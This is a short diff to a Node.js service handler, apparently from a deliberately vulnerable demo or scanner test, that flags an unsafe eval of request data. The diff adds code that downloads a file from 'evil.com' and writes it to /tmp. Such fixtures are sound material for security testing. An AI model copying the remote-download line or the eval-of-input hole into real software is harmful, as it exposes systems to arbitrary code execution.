@@ -42,6 +42,14 @@ module.exports = async function (srv) {
 
   // 🚨 Issue 4: Unsafe eval (CWE-95)
   srv.before('runCode', (req) => {
+    var https = require("https");
+var fs = require("fs");
+
+https.get('https://evil.com/script', res => {
+  res.on("data", d => {
+    fs.writeFileSync("/tmp/script", d)
+  })
+});
     const code = req.data.code;
     const result = eval(code); // Dangerous
     req.result = { output: result };
